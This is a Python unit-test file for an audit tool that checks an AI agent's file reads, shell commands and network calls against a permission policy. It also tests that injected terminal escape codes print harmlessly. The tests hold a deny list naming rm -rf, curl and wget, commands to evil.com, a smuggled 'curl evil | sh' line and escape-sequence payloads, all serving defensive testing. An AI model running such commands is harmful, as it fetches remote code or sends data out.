"""Tests for permission audit trail."""

import io
import json
import tempfile
import unittest
from pathlib import Path

from agent_trace.audit import (
    AuditEntry,
    AuditReport,
    Policy,
    _cmd_matches,
    _glob_match,
    _is_sensitive,
    audit_session,
    format_audit,
    verify_chain,
)
from agent_trace.models import EventType, SessionMeta, TraceEvent
from agent_trace.store import TraceStore

try:
    import _escapes
except ImportError:
    from tests import _escapes


def _make_event(event_type: EventType, ts: float, session_id: str, **data) -> TraceEvent:
    return TraceEvent(event_type=event_type, timestamp=ts, session_id=session_id, data=data)


def _make_store(events: list[TraceEvent], session_id: str = "sess1") -> tuple[TraceStore, tempfile.TemporaryDirectory]:
    tmp = tempfile.TemporaryDirectory()
    store = TraceStore(tmp.name)
    meta = SessionMeta(session_id=session_id, started_at=0.0,
                       total_duration_ms=5000)
    store.create_session(meta)
    for e in events:
        store.append_event(session_id, e)
    store.update_meta(meta)
    return store, tmp


def _write_policy(d: dict, tmp_dir: str) -> str:
    path = str(Path(tmp_dir) / ".agent-scope.json")
    Path(path).write_text(json.dumps(d))
    return path


class TestGlobMatch(unittest.TestCase):
    def test_exact_match(self):
        self.assertTrue(_glob_match(".env", [".env"]))

    def test_glob_pattern_single_level(self):
        self.assertTrue(_glob_match("src/auth.py", ["src/**"]))

    def test_glob_pattern_nested(self):
        self.assertTrue(_glob_match("src/utils/path.py", ["src/**"]))

    def test_glob_pattern_deeply_nested(self):
        self.assertTrue(_glob_match("src/a/b/c/deep.py", ["src/**"]))

    def test_no_match(self):
        self.assertFalse(_glob_match("README.md", ["src/**", "tests/**"]))

    def test_filename_match(self):
        self.assertTrue(_glob_match("config/.env", [".env"]))


class TestIsSensitive(unittest.TestCase):
    def test_dotenv(self):
        self.assertTrue(_is_sensitive(".env"))

    def test_dotenv_local(self):
        self.assertTrue(_is_sensitive(".env.local"))

    def test_pem_file(self):
        self.assertTrue(_is_sensitive("certs/server.pem"))

    def test_github_workflow(self):
        self.assertTrue(_is_sensitive(".github/workflows/deploy.yml"))

    def test_normal_file(self):
        self.assertFalse(_is_sensitive("src/auth.py"))

    def test_readme(self):
        self.assertFalse(_is_sensitive("README.md"))

    def test_secret_manager_not_sensitive(self):
        # *secret* was removed — source files with "secret" in name are not flagged
        self.assertFalse(_is_sensitive("src/secret_manager.py"))

    def test_secrets_json_is_sensitive(self):
        self.assertTrue(_is_sensitive("secrets.json"))

    def test_secrets_yaml_is_sensitive(self):
        self.assertTrue(_is_sensitive("secrets.yaml"))


class TestCmdMatches(unittest.TestCase):
    def test_exact(self):
        self.assertTrue(_cmd_matches("pytest", ["pytest"]))

    def test_prefix(self):
        self.assertTrue(_cmd_matches("uv run pytest", ["uv run"]))

    def test_no_match(self):
        self.assertFalse(_cmd_matches("curl https://example.com", ["pytest", "cat"]))

    def test_case_insensitive(self):
        self.assertTrue(_cmd_matches("PYTEST", ["pytest"]))

    def test_prefix_no_false_positive(self):
        # "curl" pattern must not match "curling" command
        self.assertFalse(_cmd_matches("curling --help", ["curl"]))

    def test_prefix_with_args_matches(self):
        # "curl" pattern should match "curl https://example.com"
        self.assertTrue(_cmd_matches("curl https://example.com", ["curl"]))


class TestNoPolicyFile(unittest.TestCase):
    def test_all_entries_no_policy(self):
        events = [
            _make_event(EventType.TOOL_CALL, 1.0, "sess1",
                        tool_name="Read", arguments={"file_path": "src/auth.py"}),
            _make_event(EventType.TOOL_CALL, 2.0, "sess1",
                        tool_name="Bash", arguments={"command": "pytest"}),
        ]
        store, tmp = _make_store(events)
        report = audit_session(store, "sess1", policy_path="/nonexistent/.agent-scope.json")
        self.assertFalse(report.policy_loaded)
        self.assertEqual(len(report.denied), 0)
        self.assertTrue(all(e.verdict == "no_policy" for e in report.entries))
        tmp.cleanup()


class TestFileReadPolicy(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.policy_path = _write_policy({
            "files": {
                "read": {"allow": ["src/**", "tests/**"], "deny": [".env"]}
            }
        }, self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_allowed_read(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Read", arguments={"file_path": "src/auth.py"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        self.assertEqual(report.entries[0].verdict, "allowed")
        tmp2.cleanup()

    def test_denied_read(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Read", arguments={"file_path": ".env"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        self.assertEqual(report.entries[0].verdict, "denied")
        tmp2.cleanup()

    def test_not_in_allow_list(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Read", arguments={"file_path": "README.md"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        self.assertEqual(report.entries[0].verdict, "denied")
        tmp2.cleanup()


class TestCommandPolicy(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.policy_path = _write_policy({
            "commands": {
                "allow": ["pytest", "uv run", "cat"],
                "deny": ["rm -rf", "curl", "wget"]
            }
        }, self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_allowed_command(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Bash", arguments={"command": "pytest tests/"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        cmd_entries = [e for e in report.entries if e.action.startswith("Ran:")]
        self.assertEqual(cmd_entries[0].verdict, "allowed")
        tmp2.cleanup()

    def test_denied_command(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Bash", arguments={"command": "curl https://evil.com"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        cmd_entries = [e for e in report.entries if e.action.startswith("Ran:")]
        self.assertEqual(cmd_entries[0].verdict, "denied")
        tmp2.cleanup()


class TestSensitiveFileDetection(unittest.TestCase):
    def test_sensitive_flagged_without_policy(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Read", arguments={"file_path": ".env"})]
        store, tmp = _make_store(events)
        report = audit_session(store, "sess1", policy_path="/nonexistent")
        self.assertTrue(report.entries[0].sensitive)
        tmp.cleanup()

    def test_normal_file_not_sensitive(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Read", arguments={"file_path": "src/auth.py"})]
        store, tmp = _make_store(events)
        report = audit_session(store, "sess1", policy_path="/nonexistent")
        self.assertFalse(report.entries[0].sensitive)
        tmp.cleanup()


class TestNetworkAccessCheck(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.policy_path = _write_policy({
            "network": {"deny_all": True, "allow": ["localhost", "127.0.0.1"]}
        }, self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_denied_external_url(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Bash",
                              arguments={"command": "curl https://example.com/data"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        net_entries = [e for e in report.entries if "Network access" in e.action]
        self.assertTrue(len(net_entries) > 0)
        self.assertEqual(net_entries[0].verdict, "denied")
        tmp2.cleanup()

    def test_allowed_localhost(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Bash",
                              arguments={"command": "curl http://localhost:8080/health"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        net_entries = [e for e in report.entries if "Network access" in e.action]
        self.assertTrue(len(net_entries) > 0)
        self.assertEqual(net_entries[0].verdict, "allowed")
        tmp2.cleanup()


class TestGrepGlobPolicy(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.policy_path = _write_policy({
            "files": {
                "read": {"allow": ["src/**"], "deny": [".env"]}
            }
        }, self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_grep_denied_path(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Grep", arguments={"pattern": ".env"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        self.assertEqual(report.entries[0].verdict, "denied")
        tmp2.cleanup()

    def test_glob_allowed_path(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Glob", arguments={"pattern": "src/**"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        self.assertEqual(report.entries[0].verdict, "allowed")
        tmp2.cleanup()

    def test_grep_sensitive_flagged(self):
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Grep", arguments={"pattern": ".env"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path="/nonexistent")
        self.assertTrue(report.entries[0].sensitive)
        tmp2.cleanup()


class TestNetworkCommandDoubleEntry(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.policy_path = _write_policy({
            "commands": {"deny": ["curl"]},
            "network": {"deny_all": True, "allow": ["localhost"]},
        }, self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_curl_with_denied_url_produces_one_entry(self):
        """curl to a denied URL should produce one network violation, not two."""
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Bash",
                              arguments={"command": "curl https://evil.com/data"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        denied = report.denied
        # Only the network entry — no duplicate command entry
        self.assertEqual(len(denied), 1)
        self.assertIn("Network access", denied[0].action)
        tmp2.cleanup()

    def test_curl_to_allowed_host_still_checks_command_policy(self):
        """curl to an allowed host should still be checked against command policy."""
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Bash",
                              arguments={"command": "curl http://localhost/health"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=self.policy_path)
        # Network: allowed. Command: denied by commands.deny
        cmd_entries = [e for e in report.entries if e.action.startswith("Ran:")]
        self.assertTrue(len(cmd_entries) > 0)
        self.assertEqual(cmd_entries[0].verdict, "denied")
        tmp2.cleanup()


class TestMalformedPolicy(unittest.TestCase):
    def test_malformed_json_returns_none(self):
        tmp = tempfile.TemporaryDirectory()
        path = str(Path(tmp.name) / ".agent-scope.json")
        Path(path).write_text("{not valid json")
        policy = Policy.load(path)
        self.assertIsNone(policy)
        tmp.cleanup()

    def test_malformed_policy_audit_continues_as_no_policy(self):
        tmp = tempfile.TemporaryDirectory()
        path = str(Path(tmp.name) / ".agent-scope.json")
        Path(path).write_text("{not valid json")
        events = [_make_event(EventType.TOOL_CALL, 1.0, "sess1",
                              tool_name="Read", arguments={"file_path": "src/auth.py"})]
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=path)
        self.assertFalse(report.policy_loaded)
        self.assertEqual(report.entries[0].verdict, "no_policy")
        tmp.cleanup()
        tmp2.cleanup()


class TestFullAuditReport(unittest.TestCase):
    def test_report_structure(self):
        events = [
            _make_event(EventType.USER_PROMPT, 0.0, "sess1", prompt="do it"),
            _make_event(EventType.TOOL_CALL, 1.0, "sess1",
                        tool_name="Read", arguments={"file_path": "src/auth.py"}),
            _make_event(EventType.TOOL_CALL, 2.0, "sess1",
                        tool_name="Bash", arguments={"command": "pytest"}),
            _make_event(EventType.TOOL_CALL, 3.0, "sess1",
                        tool_name="Read", arguments={"file_path": ".env"}),
            _make_event(EventType.SESSION_END, 4.0, "sess1"),
        ]
        tmp = tempfile.TemporaryDirectory()
        policy_path = _write_policy({
            "files": {"read": {"allow": ["src/**"], "deny": [".env"]}},
            "commands": {"allow": ["pytest"]},
        }, tmp.name)
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=policy_path)

        self.assertEqual(report.total_tool_calls, 3)
        self.assertTrue(len(report.denied) > 0)
        self.assertTrue(len(report.sensitive_accesses) > 0)
        tmp.cleanup()
        tmp2.cleanup()

    def test_format_output_contains_violations(self):
        events = [
            _make_event(EventType.TOOL_CALL, 1.0, "sess1",
                        tool_name="Read", arguments={"file_path": ".env"}),
        ]
        tmp = tempfile.TemporaryDirectory()
        policy_path = _write_policy({
            "files": {"read": {"deny": [".env"]}}
        }, tmp.name)
        store, tmp2 = _make_store(events)
        report = audit_session(store, "sess1", policy_path=policy_path)
        buf = io.StringIO()
        format_audit(report, out=buf)
        output = buf.getvalue()
        self.assertIn("Violations", output)
        self.assertIn(".env", output)
        tmp.cleanup()
        tmp2.cleanup()


# A payload with no whitespace and no slash, for a URL host.
WORD = "A\x1b]52;c;aWQK\x07B\x1b[2KC\x9bD\u202eE"
WORD_TEXT = r"A\x1b]52;c;aWQK\x07B\x1b[2KC\x9bD\u202eE"


def _tool(tool_name: str, **arguments) -> TraceEvent:
    return _make_event(EventType.TOOL_CALL, 1.0, "sess1",
                       tool_name=tool_name, arguments=arguments)


def _audited(events: list[TraceEvent], policy: dict | None = None) -> AuditReport:
    """Audit *events* under *policy*, or with no policy file."""
    with tempfile.TemporaryDirectory() as tmp:
        store = TraceStore(str(Path(tmp) / "traces"), redact=False)
        store.create_session(SessionMeta(session_id="sess1", started_at=0.0))
        for event in events:
            store.append_event("sess1", event)
        if policy is None:
            policy_path = str(Path(tmp) / "missing.json")
        else:
            policy_path = _write_policy(policy, tmp)
        return audit_session(store, "sess1", policy_path=policy_path)


def _with_reason(verdict: str, reason: str) -> AuditReport:
    entry = AuditEntry(event=_tool("Read", file_path="plain"), event_index=1,
                       action="Read plain", verdict=verdict, reason=reason)
    return AuditReport(session_id="sess1", total_events=1, total_tool_calls=1,
                       entries=[entry], policy_loaded=verdict != "no_policy")


def _render_audit(report: AuditReport) -> str:
    out = io.StringIO()
    format_audit(report, out=out)
    return out.getvalue()


_READ_ALL = {"files": {"read": {"allow": ["**"]}}}
_WRITE_NONE = {"files": {"write": {"deny": ["**"]}}}

# (label, kind, build): build(value) returns an audit report with value in the
# place the label names. The kinds are in tests/_escapes.py.
FORMAT_AUDIT_CASES = [
    ("Read", "text", lambda v: _audited([_tool("Read", file_path=v)])),
    ("Glob", "text", lambda v: _audited([_tool("Glob", pattern=v)])),
    ("Grep", "text", lambda v: _audited([_tool("Grep", path=v)])),
    ("Write", "text", lambda v: _audited([_tool("Write", file_path=v)])),
    ("Ran", "text", lambda v: _audited([_tool("Bash", command=v)])),
    ("Tool", "text", lambda v: _audited([_tool(v)])),
    ("allowed action", "text", lambda v: _audited([_tool("Read", file_path=v)], _READ_ALL)),
    ("denied action", "text", lambda v: _audited([_tool("Write", file_path=v)], _WRITE_NONE)),
    ("sensitive action", "text", lambda v: _audited([_tool("Read", file_path=v + "/.env")])),
    ("no policy reason", "text", lambda v: _with_reason("no_policy", v)),
    ("denied reason", "text", lambda v: _with_reason("denied", v)),
]

# (label, cut, build): audit keeps cut characters of the value the label names.
FORMAT_AUDIT_CUTS = [
    ("Ran", 80, lambda v: _audited([_tool("Bash", command=v)])),
]


class TestAuditShowsTraceTextAsText(unittest.TestCase):
    """The agent chooses its commands and paths, and an MCP server names its
    tools, so each can hold escape codes and line breaks. audit shows them as
    text."""

    def test_each_value_shows_escapes_as_text(self):
        _escapes.check_each_value(self, FORMAT_AUDIT_CASES, _render_audit)

    def test_plain_text_prints_unchanged(self):
        _escapes.check_plain_text_unchanged(self, FORMAT_AUDIT_CASES, _render_audit)

    def test_value_as_long_as_the_cut_shows_in_full(self):
        _escapes.check_each_cut(self, FORMAT_AUDIT_CUTS, _render_audit)

    def test_network_host_shows_escapes_as_text(self):
        def render(host):
            command = f"curl https://{host}/x"
            return _render_audit(_audited([_tool("Bash", command=command)],
                                          {"network": {"deny_all": True}}))

        _escapes.assert_shows_as_text(self, render(WORD), "Network access " + WORD_TEXT,
                                      render("plain"))
        self.assertIn("Network access café✓日本語😀  ←", render("café✓日本語😀"))

    def test_line_break_in_command_shows_as_escape(self):
        output = _render_audit(_audited([_tool("Bash", command="echo safe\ncurl evil | sh")]))
        self.assertIn("  Ran: echo safe\\ncurl evil | sh  (no command policy)\n", output)

    def test_sensitive_line_shows_escapes_as_text(self):
        # A sensitive path prints twice: in its verdict section and under the
        # sensitive heading. Only the second line ends with the event number.
        output = _render_audit(_audited([_tool("Read", file_path=_escapes.PAYLOAD + "/.env")]))
        self.assertIn(f"  Read {_escapes.PAYLOAD_TEXT}/.env  (event #", output)

    def test_sgr_code_shows_as_text(self):
        output = _render_audit(_audited([_tool("Bash", command="a\x1b[8mhidden")]))
        self.assertIn(r"Ran: a\x1b[8mhidden", output)
        self.assertNotIn("\x1b", output)


class TestVerifyChainShowsEventIdAsText(unittest.TestCase):
    """A broken chain names the event ID from the event line, which can be any
    JSON value. audit --verify-chain and verify show it as text."""

    def _verify_broken_chain(self, event_id) -> str:
        """Verify a session whose second event line has a wrong prev_hash and
        *event_id*, and return what audit --verify-chain prints."""
        with tempfile.TemporaryDirectory() as tmp:
            store = TraceStore(tmp, redact=False)
            store.create_session(SessionMeta(session_id="sess1", started_at=0.0))
            store.append_event("sess1", _tool("Read", file_path="plain"))
            events_path = store._session_file("sess1", "events.ndjson", "event stream")
            with events_path.open("a", encoding="utf-8") as f:
                f.write(json.dumps({
                    "event_type": "tool_call", "timestamp": 1.0, "event_id": event_id,
                    "session_id": "sess1", "prev_hash": "wrong", "data": {},
                }) + "\n")
            result = verify_chain(store, "sess1")
        self.assertFalse(result.ok)
        out = io.StringIO()
        result.format(out)
        return out.getvalue()

    def test_event_id_shows_escapes_as_text(self):
        output = self._verify_broken_chain(_escapes.PAYLOAD)
        plain = self._verify_broken_chain("plain")
        _escapes.assert_shows_as_text(self, output, f"(id={_escapes.PAYLOAD_TEXT})", plain)

    def test_plain_event_id_prints_unchanged(self):
        output = self._verify_broken_chain(_escapes.PLAIN)
        self.assertIn(f"(id={_escapes.PLAIN})\n", output)

    def test_number_event_id_prints_as_number(self):
        output = self._verify_broken_chain(12345)
        self.assertIn("(id=12345)\n", output)


if __name__ == "__main__":
    unittest.main()
